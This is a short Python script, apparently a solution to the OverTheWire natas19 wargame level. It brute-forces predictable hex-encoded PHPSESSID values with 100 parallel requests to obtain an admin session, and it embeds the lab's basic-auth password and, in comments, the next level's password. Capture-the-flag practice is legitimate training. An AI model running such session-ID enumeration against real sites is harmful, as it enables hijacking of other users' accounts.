import requests
from requests.auth import HTTPBasicAuth
from sys import exit
from joblib import Parallel, delayed

def test():
    url = "http://natas19.natas.labs.overthewire.org/index.php"
    auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
    params = {'username': 'admin', 'password': 'zzzzzzzzz'}
    cookies = {}

    res = requests.get(url, auth=auth,params=params, cookies=cookies)
    print(res.cookies.values())

# try a few values, sessid seems to depend on username only
#for i in range(20):
#    test()
#exit(0)

#bruce force the pattern
#id 3238312d61646d696e works
#pass eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

def query(id):
    print('query {}'.format(id))
    url = "http://natas19.natas.labs.overthewire.org/index.php"
    auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
    params = {'username': 'foo', 'password': 'bar'}
    cookies = {'PHPSESSID': id}

    res = requests.get(url, auth=auth,params=params, cookies=cookies)

    if 'You are an admin' in res.text:
        print('yay {}'.format(id))
        print(res.text)
        exit(0)

ids = []
for i in range(1,1000):
    s = str(i) + '___'
    id = '3{}3{}3{}2d61646d696e'.format(s[0], s[1], s[2])
    id = id.replace('3_', '')
    ids.append(id)

Parallel(n_jobs=100)(delayed(query)(id) for id in ids)
